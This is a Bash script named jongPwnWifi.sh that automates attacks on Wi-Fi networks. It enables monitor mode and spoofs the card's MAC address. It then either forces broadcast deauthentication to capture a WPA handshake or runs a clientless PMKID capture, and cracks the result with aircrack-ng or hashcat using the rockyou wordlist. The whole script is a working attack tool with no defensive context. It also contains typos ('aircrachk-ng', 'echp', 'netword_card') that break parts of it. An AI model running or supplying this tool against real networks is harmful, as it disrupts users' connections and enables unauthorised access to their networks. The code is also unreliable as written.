#!/bin/bash

┄Author: Jongsu

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c() {
  echo -e "${redColour}[!] Saliendo${endColour}"

  airmon-ng stop ${network_card}mon

  rm Capture* 2>/dev/null

  tput cnorm; exit 0
}

function helpPanel() {

  echo -e "\n${redColour}[!] Usage: ./jongPwnWifi.sh${endColour}"

  for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "$endColour"

  echo -e "\n\n\t${grayColour}[-a]${endColour}${yellowColour} Attack mode${endColour}"
  echo -e "\t\t${purpleColour}Handshake${endColour}"
  echo -e "\t\t${purpleColour}PKMID${endColour}"

  echo -e "\n\t${grayColour}[-n]${endColour}${yellowColour} Name of the network card${endColour}"

  echo -e "\n\t${grayColour}[-h]${endColour}${yellowColour} Show the help panel${endColour}\n\n"

  for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}\n"

  tput cnorm;  exit 1
}

function dependencies() {

  tput civis
  clear; dependencies=(airmon-ng, macchanger)

  echo -e "${redColour}[!] Checking dependencies${endColour}"

  for i in $(seq 1 80); do echo -ne "${redColour}-"; done; echo -ne "${endColour}\n\n"

  sleep 1

  for program in "${dependencies[@]}"; do

    echo -ne "${yellowColour}[*] Tool: ${endColour}${purpleColour}$program${endColour}"

    test -f /usr/bin/$program

    if [ "$(echo $?)" == "0" ]; then
      echo -e " ${greenColour}(V)${endColour}\n"
    else
      echo -e " ${redColour}(X)${endColour}\n"
      echo -e "${yellowColour}[*] Installing tool ${endColour}${blueColour}${program}...${endColour}\n"

      pacman -S --noconfirm $program > /dev/null 2>&1 

      echo -e "${yellowColour}[*] Finished installing ${endColour}${blueColour}${program}...${endColour}\n"
    fi; sleep 1
  done
}

function configureNetworkCard() {

  clear

  echo -e "${yellowColour}[*] Configuring network card...${endColour}\n"

  airmon-ng start $network_card
  ifconfig ${network_card}mon down && macchanger -a ${network_card}mon > /dev/null
  ifconfig ${network_card}mon up
  
  killall wpa_supplicant dhclient 2>/dev/null

  echo -e "${yellowColour}[*] New MAC address assigned: ${endColour}${purpleColour}$(macchanger -s ${netword_card}mon | 
  grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"
}

function HandshakeAttack() {

  configureNetworkCard

  xterm -hold -e "airodump-ng ${network_card}mon" &
  airodump_xterm_PID=$!

  echo -e "\n${grayColour}[] Name of the access point: ${endColour}" && read apName
  echo -e "\n${grayColour}[] Access point channel: ${endColour}" && read apChannel

  kill -9 $airodump_xterm_PID
  wait $airodump_xterm_PID 2>/dev/null

  xterm -hold -e "airodump-ng -c $apChannel -w Capture --essid $apName ${network_card}mon" &
  airodump_filter_xterm_PID=$!

  sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${network_card}mon" & 
  aireplay_xterm_PID=$!

  sleep 10; kill -9 $aireplay_xterm_PID
  wait $aireplay_xterm_PID 2>/dev/null

  sleep 10; kill -9 $airodump_filter_xterm_PID
  wait $airodump_filter_xterm_PID 2>/dev/null

  xterm -hold -e "aircrachk-ng -w /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Capture-01.cap" &
}

function PKMIDAttack() {

  configureNetworkCard

  echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Inicializing ClientLess PKMID attack${endColour}"

  sleep 2; timeout 60 bash -c "hcxdumptool -i ${netword_card}mon --enable_status=1 -o Capture"

  echo -e "\n\n${yellowColour}[*]${endColour} ${grayColour}Getting hashes...${endColour}"

  sleep 2; hcxpcaptool -z myHashes Capture; rm Capture 2>/dev/null

  test -f myHashes

  if [ "$(echp $?)" == "0" ]; then
    echo -e "\n${yellowColour}[]${endColour} ${grayColour}Inicializing brute force process...${endColour}"
    hashcat -m 16800 /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt  myHashes -d 1 --force
  else
    echo -e "\n${redColour}[!] The needed package couldn't be intercepted...${endColour}"; rm Capture 2>/dev/null
    sleep 2
  fi
}

# Main function

if [ "$(id -u)" == "0" ]; then
  declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
    case $arg in
    a) attack_mode=$OPTARG; let parameter_counter+=1;;
    n) network_card=$OPTARG; let parameter_counter+=1;;
    h) helpPanel;;
    esac
  done
  
  if [ $parameter_counter -ne 2 ]; then
  helpPanel
  else
    dependencies

    if [ "$(echo $attack_mode)" == "Handshake" ]; then
      HandshakeAttack
    elif [ "$(echo $attack_mode)" == "PKMID" ]; then
      PKMIDAttack
    else
      echo -e "\n${redColour}This attack mode is not valid${endColour}\n"
    fi

    airmon-ng stop ${network_card}mon > /dev/null 2>&1

    rm Capture* 2>/dev/null

    tput cnorm
  fi

else
  echo -e "${redColour}You need root privileges${endColour}"
  helpPanel
fi
